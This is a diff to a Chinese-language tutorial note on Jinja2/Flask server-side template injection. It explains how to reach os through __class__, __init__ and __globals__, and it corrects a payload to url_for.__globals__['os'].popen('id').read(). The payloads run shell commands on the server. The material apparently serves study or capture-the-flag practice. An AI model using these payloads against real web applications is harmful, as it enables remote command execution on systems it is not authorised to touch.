@@ -17,6 +17,14 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 
 
 
+模板注入过程
+
+```
+实例对象-->类对象-->函数对象-->全局函数字典
+```
+
+
+
 #### `__class__`:获取元素的类型
 
 ##### 变量/对象.__class__:元素的类型
@@ -42,10 +50,10 @@ print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 ```
 cat().__class__.__init__
 ```
-#### **或者直接使用`url_for()`,`get_flashed_messages()`,lipsum,cycler(),joiner(),namespace()这些象征函数对象方法的**
+#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum,cycler,joiner,namespace这些象征函数对象的,使用是不用在经过__class__.__init__调出函数对象**
 
 ```
-url_for().__globals__['os'].popen('id').read()
+url_for.__globals__['os'].popen('id').read()
 ```
 
 #### `__globals__`:对象方法模块出生的全局字典,包含os等主要模块
